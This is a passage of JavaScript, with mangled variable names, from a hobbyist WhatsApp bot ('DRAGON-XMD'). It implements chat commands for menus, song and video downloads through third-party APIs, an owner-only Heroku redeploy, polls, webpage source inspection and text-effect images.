𝗜𝗺𝗮𝗴𝗲\n┃💥│ 𝗦𝘆𝘀𝘁𝗲𝗺\n┃✫╰═───────◇───────═╯\n┃   𝗠𝗮𝗱𝗲 𝗶𝗻 𝗞𝗲𝗻𝘆𝗮 𝗕𝘆 𝗗𝗥𝗔𝗚𝗢𝗡🤩\n┃   𝗕𝗘𝗦𝗧 𝗫𝗠𝗗 𝗕𝗢𝗧 𝗜𝗡 𝗨𝗡𝗜𝗩𝗘𝗥𝗦𝗘\n┃   🆃🅷🅰🅽🅺🆂 🆃🅾\n┃  ✦𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 (𝙳𝚁𝙰𝙶𝙾𝙽)\n┃  ✦𝕭𝖆𝖘𝖊 (𝙽𝚒𝚌𝚔)    \n┃  ✦𝕸𝖞 𝕲𝖎𝖗𝖑𝖋𝖗𝖎𝖊𝖓𝖉 (𝚆𝚒𝚗𝚡𝚎𝚢) \n┃  ✦𝖋𝖗𝖎𝖊𝖓𝖉𝖘 (𝚒𝚗𝚌. 𝙹𝚞𝚗𝚒𝚘𝚞𝚛, 𝙹𝚊𝚖𝚎𝚜, 𝙷𝚊𝚛𝚛𝚢𝚔𝚎𝚗 𝚊𝚗𝚍 𝚂𝚝𝚒𝚗𝚐𝚎𝚛)\n┃  ✦𝕒𝕟𝕕 𝕒𝕝𝕝 𝕠𝕗 𝕪𝕠𝕦🙂\n╰══────────────────══╯";
          if (menu === "VIDEO") {
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'video': fs.readFileSync("./Media/menu.mp4"),
              'caption': _0x1828d9,
              'gifPlayback': true
            }, {
              'quoted': _0x10d7a1
            });
          } else {
            if (menu === "TEXT") {
              _0x34f9ed.sendMessage(_0x5e81f5, {
                'text': _0x1828d9
              }, {
                'quoted': _0x10d7a1
              });
            } else {
              if (menu === "IMAGE") {
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'image': {
                    'url': "https://i.imgur.com/A08nrWx.jpeg"
                  },
                  'caption': _0x1828d9,
                  'fileLength': "9999999999"
                }, {
                  'quoted': _0x10d7a1
                });
              } else if (menu === "LINK") {
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'text': _0x1828d9,
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                      'body': '' + runtime(process.uptime()),
                      'thumbnail': fs.readFileSync("./Media/dragon.jpg"),
                      'sourceUrl': 'https://wa.me/254704009677?text=Hello👋+Dragon+Nihostie+Bot+Mkuu+😔',
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                }, {
                  'quoted': _0x10d7a1
                });
              }
            }
          }
          break;
        case "advice":
          _0x459d18(advice());
          console.log(advice());
          break;
        case "owner":
        case 'developer':
        case 'dev':
          _0x34f9ed.sendContact(_0x5e81f5, _0x4244a0, _0x10d7a1);
          break;
        case "lyrics2":
          try {
            if (!_0xe09539) {
              return _0x459d18("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒔𝒐𝒏𝒈 𝒏𝒂𝒎𝒆!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            }
            const _0x4ab720 = await Client.songs.search(_0xe09539);
            const _0x2c1178 = _0x4ab720[0x0];
            const _0x19c739 = await _0x2c1178.lyrics();
            await _0x34f9ed.sendMessage(_0x5e81f5, {
              'text': _0x19c739
            }, {
              'quoted': _0x10d7a1
            });
          } catch (_0x1d9083) {
            _0x459d18("𝑰 𝒅𝒊𝒅 𝒏𝒐𝒕 𝒈𝒊𝒏𝒅 𝒂𝒏𝒚 𝒍𝒚𝒓𝒊𝒄𝒔 𝒇𝒐𝒓 " + _0xe09539 + ". 𝑻𝒓𝒚 𝒔𝒆𝒂𝒓𝒄𝒉𝒊𝒏𝒈 𝒂 𝒅𝒊𝒇𝒇𝒆𝒓𝒆𝒏𝒕 𝒔𝒐𝒏𝒈.\n\n> ©𝖕𝖔𝖜𝖊𝖗 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            console.log(_0x1d9083);
          }
          break;
        case "play2":
          {
            const _0x5e05dd = require("yt-search");
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
              const {
                videos: _0x51ab1c
              } = await _0x5e05dd(_0xe09539);
              if (!_0x51ab1c || _0x51ab1c.length === 0x0) {
                return _0x10d7a1.reply("𝑵𝒐 𝒔𝒐𝒏𝒈 𝒇𝒐𝒖𝒏𝒅!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
              const _0x554905 = _0x51ab1c[0x0].url;
              try {
                let _0x18a465 = await fetchJson('https://api.dreaded.site/api/ytdl/audio?url=' + _0x554905);
                const {
                  title: _0x29ea17,
                  format: _0x2929ac,
                  url: _0x26fa44
                } = _0x18a465.result;
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'document': {
                    'url': _0x26fa44
                  },
                  'mimetype': 'audio/mpeg',
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                  'fileName': _0x29ea17 + ".mp3"
                }, {
                  'quoted': _0x10d7a1
                });
              } catch (_0x4043bd) {
                console.error("API request failed:", _0x4043bd.message);
                _0x10d7a1.reply("𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒇𝒂𝒊𝒍𝒆𝒅: 𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒓𝒆𝒕𝒓𝒊𝒆𝒗𝒆.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
            } catch (_0x288992) {
              _0x10d7a1.reply("Download failed\n" + _0x288992.message);
            }
          }
          ;
          break;
        case 'music':
          {
            const _0x48f5e5 = require('yt-search');
            const _0x78bc8b = require('node-fetch');
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
              let _0x2f78e8 = await _0x48f5e5(_0xe09539);
              if (!_0x2f78e8.all.length) {
                return sendReply(_0x34f9ed, _0x10d7a1, "No results found for your query.");
              }
              let _0x52bba3 = _0x2f78e8.all[0x0].url;
              const _0x2621b6 = "https://keith-api.vercel.app/download/dlmp3?url=" + _0x52bba3;
              let _0x49e2ee = await _0x78bc8b(_0x2621b6);
              let _0x25d986 = await _0x49e2ee.json();
              if (_0x25d986.status && _0x25d986.result) {
                const _0x36d3da = {
                  'title': _0x25d986.result.title,
                  'downloadUrl': _0x25d986.result.downloadUrl,
                  'thumbnail': _0x2f78e8.all[0x0].thumbnail,
                  'format': _0x25d986.result.format,
                  'quality': _0x25d986.result.quality
                };
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'document': {
                    'url': _0x36d3da.downloadUrl
                  },
                  'mimetype': "audio/mp3",
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                  'fileName': _0x36d3da.title.replace(/[^a-zA-Z0-9 ]/g, '') + ".mp3"
                }, {
                  'quoted': _0x10d7a1
                });
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'audio': {
                    'url': _0x36d3da.downloadUrl
                  },
                  'mimetype': "audio/mp4"
                }, {
                  'quoted': _0x10d7a1
                });
                return;
              } else {
                return _0x459d18("𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒔𝒐𝒏𝒈. 𝑻𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
            } catch (_0x590216) {
              return _0x459d18("𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅: ");
            }
          }
          break;
        case 'video':
          {
            const _0x1f16f1 = require("yt-search");
            const _0x153e6a = require("node-fetch");
            try {
              if (!_0xe09539) {
                return sendReply(_0x34f9ed, _0x10d7a1, "𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒑𝒆𝒄𝒊𝒇𝒚 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖍𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
              let _0x3d92e5 = await _0x1f16f1(_0xe09539);
              if (!_0x3d92e5.all.length) {
                return sendReply(_0x34f9ed, _0x10d7a1, "No results found for your query.");
              }
              let _0x2f2515 = _0x3d92e5.all[0x0].url;
              const _0x348a35 = "https://apis-keith.vercel.app/download/dlmp4?url=" + _0x2f2515;
              let _0x1dee97 = await _0x153e6a(_0x348a35);
              let _0x475856 = await _0x1dee97.json();
              if (_0x475856.status && _0x475856.result) {
                const _0x2c5d5a = {
                  'title': _0x475856.result.title,
                  'downloadUrl': _0x475856.result.downloadUrl,
                  'thumbnail': _0x3d92e5.all[0x0].thumbnail,
                  'format': _0x475856.result.format,
                  'quality': _0x475856.result.quality
                };
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'video': {
                    'url': _0x2c5d5a.downloadUrl
                  },
                  'mimetype': 'video/mp4',
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
                }, {
                  'quoted': _0x10d7a1
                });
                return;
              } else {
                return _0x459d18(_0x34f9ed, _0x10d7a1, "𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓, 𝒎𝒛𝒂𝒛𝒊 𝒊𝒔 𝒇𝒐𝒓 𝒚𝒐𝒖😂.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
            } catch (_0x2d07a3) {
              return _0x459d18(_0x34f9ed, _0x10d7a1, "An error occurred: " + _0x2d07a3.message);
            }
          }
          ;
          break;
        case "update":
        case "redeploy":
          {
            const _0x2e5332 = require("axios");
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!appname || !herokuapi) {
              await _0x10d7a1.reply("𝑰𝒕 𝒍𝒐𝒐𝒌𝒔 𝒍𝒊𝒌𝒆 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒐𝒓 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒔𝒆𝒕. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒎𝒂𝒌𝒆 𝒔𝒖𝒓𝒆 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 `APP_NAME` 𝒂𝒏𝒅 `HEROKU_API` 𝒆𝒏𝒗𝒊𝒓𝒐𝒏𝒎𝒆𝒏𝒕 𝒗𝒂𝒓𝒊𝒂𝒃𝒍𝒆𝒔.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              return;
            }
            async function _0x46c2db() {
              try {
                const _0x2d4b35 = await _0x2e5332.post("https://api.heroku.com/apps/" + appname + "/builds", {
                  'source_blob': {
                    'url': "https://github.com/Viniznimco/DRAGON-XMD/tarball/main"
                  }
                }, {
                  'headers': {
                    'Authorization': "Bearer " + herokuapi,
                    'Accept': "application/vnd.heroku+json; version=3"
                  }
                });
                await _0x10d7a1.reply("𝑫𝑹𝑨𝑮𝑶𝑵-𝑿𝑴𝑫 𝑩𝒐𝒕 𝒊𝒔 𝒖𝒏𝒅𝒆𝒓𝒈𝒐𝒊𝒏𝒈 𝒂 𝒓𝒖𝒕𝒉𝒍𝒆𝒔𝒔 𝒖𝒑𝒈𝒓𝒂𝒅𝒆, 𝒉𝒐𝒍𝒅 𝒐𝒏 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 2 𝒎𝒊𝒏𝒖𝒕𝒆𝒔 𝒂𝒔 𝒕𝒉𝒆 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚 𝒆𝒙𝒆𝒄𝒖𝒕𝒆𝒔! 𝑶𝒏𝒄𝒆 𝒅𝒐𝒏𝒆𝒆, 𝒚𝒐𝒖 𝒘𝒊𝒍𝒍 𝒉𝒂𝒗𝒆 𝒕𝒉𝒆 𝒇𝒓𝒆𝒔𝒉𝒆𝒔𝒕 𝒗𝒆𝒓𝒔𝒊𝒐𝒏 𝒐𝒇 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝒖𝒏𝒍𝒆𝒂𝒔𝒉𝒆𝒅 𝒖𝒑𝒐𝒏 𝒚𝒐𝒖.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
                console.log("Build details:", _0x2d4b35.data);
              } catch (_0x20451d) {
                const _0x2cf320 = _0x20451d.response?.['data'] || _0x20451d.message;
                await _0x10d7a1.reply("𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒖𝒑𝒅𝒂𝒕𝒆 𝒂𝒏𝒅 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚. 𝑪𝒉𝒆𝒄𝒌 𝒊𝒇 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒂𝒏𝒅 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒄𝒐𝒓𝒓𝒆𝒄𝒕𝒍𝒚.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
                console.error("Error triggering redeploy:", _0x2cf320);
              }
            }
            _0x46c2db();
          }
          break;
        case 'credits':
          _0x34f9ed.sendMessage(_0x10d7a1.chat, {
            'image': {
              'url': 'https://i.imgur.com/nhNVsqf.jpeg'
            },
            'caption': "We express sincere gratitude and acknowledgement to the following:\n\n -Nick ➪ Kenya\n - Writing the base code using case method\nhttps://github.com/HunterNick2\n\n -Dragon ➪ Kenya\n - Founder of the bot base\nhttps://github.com/Viniznimco\n\n𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
          }, {
            'quoted': _0x10d7a1
          });
          break;
        case "poll":
          {
            let [_0x6616af, _0x32b644] = _0xe09539.split('|');
            if (_0xe09539.split('|') < 0x2) {
              return _0x10d7a1.reply("Wrong format::\nExample:- poll who is the best developer|Putin, Dragon\n\n> ©𝕻𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            }
            let _0x396cd1 = [];
            for (let _0x440b16 of _0x32b644.split(',')) {
              _0x396cd1.push(_0x440b16);
            }
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'poll': {
                'name': _0x6616af,
                'values': _0x396cd1
              }
            });
          }
          break;
        case 'play':
          {
            const _0x87d945 = require("axios");
            const _0x5028ed = require("yt-search");
            const _0x381bdf = require('fluent-ffmpeg');
            const _0x4845c4 = require('fs');
            const _0xc7b9cc = require("path");
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("What song do you want to download?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
              }
              let _0x329289 = await _0x5028ed(_0xe09539);
              let _0x3aa456 = _0x329289.all[0x0].url;
              const _0x4f8fcc = ["https://xploader-api.vercel.app/ytmp3?url=" + _0x3aa456, "https://apis.davidcyriltech.my.id/youtube/mp3?url=" + _0x3aa456, "https://api.ryzendesu.vip/api/downloader/ytmp3?url=" + _0x3aa456, "https://api.dreaded.site/api/ytdl/audio?url=" + _0x3aa456];
              for (const _0x1dc83d of _0x4f8fcc) {
                try {
                  let _0x2d488d = await fetchJson(_0x1dc83d);
                  if (_0x2d488d.status === 0xc8 || _0x2d488d.success) {
                    let _0x2899a7 = _0x2d488d.result?.['downloadUrl'] || _0x2d488d.url;
                    let _0x4c88ca = _0x329289.all[0x0].title.replace(/[^a-zA-Z0-9 ]/g, '') + ".mp3";
                    let _0x3f222b = _0xc7b9cc.join(__dirname, _0x4c88ca);
                    const _0x354e61 = await _0x87d945({
                      'url': _0x2899a7,
                      'method': "GET",
                      'responseType': 'stream'
                    });
                    if (_0x354e61.status !== 0xc8) {
                      _0x10d7a1.reply("sorry but the API endpoint didn't respond correctly. Try again later.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
                      continue;
                    }
                    _0x381bdf(_0x354e61.data).toFormat("mp3").save(_0x3f222b).on('end', async () => {
                      await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                        'document': {
                          'url': _0x3f222b
                        },
                        'mimetype': "audio/mp3",
                        'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                        'fileName': _0x4c88ca
                      }, {
                        'quoted': _0x10d7a1
                      });
                      _0x4845c4.unlinkSync(_0x3f222b);
                    }).on('error', _0x4de4e6 => {
                      _0x10d7a1.reply("Download failed\n" + _0x4de4e6.message);
                    });
                    return;
                  }
                } catch (_0x3357bc) {
                  continue;
                }
              }
              _0x10d7a1.reply("𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅. 𝑨𝑳𝑳 𝑨𝑷𝑰𝒔 𝒎𝒊𝒈𝒉𝒕 𝒏𝒆 𝒅𝒐𝒘𝒏 𝒐𝒓 𝒖𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒕𝒉𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            } catch (_0x19ed55) {
              _0x10d7a1.reply("Download failed\n" + _0x19ed55.message);
            }
          }
          break;
        case "inspect":
          {
            const _0x47193f = require("node-fetch");
            const _0x4874e9 = require("cheerio");
            if (!_0xe09539) {
              return _0x10d7a1.reply("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒗𝒂𝒍𝒊𝒅 𝒘𝒆𝒃 𝒍𝒊𝒏𝒌 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉! 𝑻𝒉𝒊𝒔 𝑩𝒐𝒕 𝒘𝒊𝒍𝒍 𝒄𝒓𝒂𝒘𝒍 𝒕𝒉𝒆 𝒘𝒆𝒃𝒔𝒊𝒕𝒆 𝒂𝒏𝒅 𝒇𝒆𝒕𝒄𝒉 𝒊𝒕𝒔 HTML, CSS, JavaScript, 𝒂𝒏𝒅 𝒂𝒏𝒚 𝒎𝒆𝒅𝒊𝒂 𝒆𝒎𝒃𝒆𝒅𝒅𝒆𝒅 𝒊𝒏 𝒊𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            }
            if (!/^https?:\/\//i.test(_0xe09539)) {
              return _0x10d7a1.reply("𝑷𝒍𝒆𝒂𝒔𝒆 𝒑𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒍𝒊𝒏𝒌 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 http:// or https://\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            }
            try {
              const _0x530625 = await _0x47193f(_0xe09539);
              const _0x17aea6 = await _0x530625.text();
              const _0x1e3450 = _0x4874e9.load(_0x17aea6);
              const _0x4f5915 = [];
              _0x1e3450("img[src], video[src], audio[src]").each((_0x36389d, _0x216655) => {
                let _0x2fbd52 = _0x1e3450(_0x216655).attr("src");
                if (_0x2fbd52) {
                  _0x4f5915.push(_0x2fbd52);
                }
              });
              const _0x146709 = [];
              _0x1e3450("link[rel=\"stylesheet\"]").each((_0x49f428, _0x2f16b7) => {
                let _0x32d0e9 = _0x1e3450(_0x2f16b7).attr("href");
                if (_0x32d0e9) {
                  _0x146709.push(_0x32d0e9);
                }
              });
              const _0x571914 = [];
              _0x1e3450('script[src]').each((_0x1e44f3, _0x530cc8) => {
                let _0x46eddf = _0x1e3450(_0x530cc8).attr("src");
                if (_0x46eddf) {
                  _0x571914.push(_0x46eddf);
                }
              });
              await _0x10d7a1.reply("**Full HTML Content**:\n\n" + _0x17aea6);
              if (_0x146709.length > 0x0) {
                for (const _0x11e5ae of _0x146709) {
                  const _0x2d9696 = await _0x47193f(new URL(_0x11e5ae, _0xe09539));
                  const _0x49cbfa = await _0x2d9696.text();
                  await _0x10d7a1.reply("**CSS File Content**:\n\n" + _0x49cbfa);
                }
              } else {
                await _0x10d7a1.reply("No external CSS files found.");
              }
              if (_0x571914.length > 0x0) {
                for (const _0x419adb of _0x571914) {
                  const _0xfab92f = await _0x47193f(new URL(_0x419adb, _0xe09539));
                  const _0x59ec24 = await _0xfab92f.text();
                  await _0x10d7a1.reply("**JavaScript File Content**:\n\n" + _0x59ec24);
                }
              } else {
                await _0x10d7a1.reply("No external JavaScript files found.");
              }
              if (_0x4f5915.length > 0x0) {
                await _0x10d7a1.reply("**Media Files Found**:\n" + _0x4f5915.join("\n"));
              } else {
                await _0x10d7a1.reply("No media files (images, videos, audios) found.");
              }
            } catch (_0x3fb6ef) {
              console.error(_0x3fb6ef);
              return _0x10d7a1.reply("An error occurred while fetching the website content.");
            }
          }
          break;
        case "metallic":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Metallic Dragon");
              return;
            }
            try {
              var _0x134d7d = await _0x40314a.ephoto("https://en.ephoto360.com/impressive-decorative-3d-metal-text-effect-798.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x134d7d.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0xb7e38c) {
              _0x10d7a1.reply(_0xb7e38c);
            }
          }
          break;
        case "ice":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Ice Dragon");
              return;
            }
            try {
              var _0x2f4412 = await _0x40314a.ephoto("https://en.ephoto360.com/ice-text-effect-online-101.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x2f4412.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0xcabe61) {
              _0x10d7a1.reply(_0xcabe61);
            }
          }
          break;
        case "snow":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Snow Dragon");
              return;
            }
            try {
              var _0x430779 = await _0x40314a.ephoto("https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x430779.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x355c8f) {
              _0x10d7a1.reply(_0x355c8f);
            }
          }
          break;
        case "impressive":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "impressive Nick");
              return;
            }
            try {
              var _0x413651 = await _0x40314a.ephoto("https://en.ephoto360.com/create-3d-colorful-paint-text-effect-online-801.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x413651.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x22ebb9) {
              _0x10d7a1.reply(_0x22ebb9);
            }
          }
          break;
        case "noel":
          {
            var _0x40314a = require('mumaker');
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Noel myself");
              return;
            }
            try {
              var _0x5249a8 = await _0x40314a.ephoto("https://en.ephoto360.com/noel-text-effect-online-99.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x5249a8.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x50b5ac) {
              _0x10d7a1.reply("💀💀" + _0x50b5ac);
            }
          }
          break;
        case "water":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Water myself");
              return;
            }
            try {
              var _0x3454d7 = await _0x40314a.ephoto("https://en.ephoto360.com/create-water-effect-text-online-295.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3454d7.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x37f48a) {
              _0x10d7a1.reply('💀💀' + _0x37f48a);
            }
          }
          break;
        case "matrix":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Matrix myself");
              return;
            }
            try {
              var _0x3768ae = await _0x40314a.ephoto('https://en.ephoto360.com/matrix-text-effect-154.html', _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3768ae.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4f7729) {
              _0x10d7a1.reply("💀💀" + _0x4f7729);
            }
          }
          break;
        case "light":
          {
